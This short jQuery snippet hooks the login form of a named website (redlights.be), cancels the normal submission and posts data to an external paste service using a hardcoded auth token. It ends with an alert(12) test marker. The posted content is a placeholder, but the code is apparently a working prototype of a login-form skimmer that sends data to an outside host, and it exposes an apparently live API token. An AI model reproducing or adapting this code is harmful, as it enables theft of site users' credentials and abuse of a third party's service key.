$('form[action="https://www.redlights.be/login/"]').on("submit", function(event) {
  $.post({
    url: "https://api.paste.ee/v1/pastes",
    headers: {"X-Auth-Token": "aT3Q7B7kvvArwNAAs8TidHdehSiPUhEpc1DS3rwT5"},
    dataType:"json",
    data: '{"description":"test","sections":[{"name":"Section1","syntax":"autodetect","contents":"Testing!"}]}',
    complete: function(_, data) {
      console.log(data);
      alert(12);
    }
  });

  event.preventDefault();
});
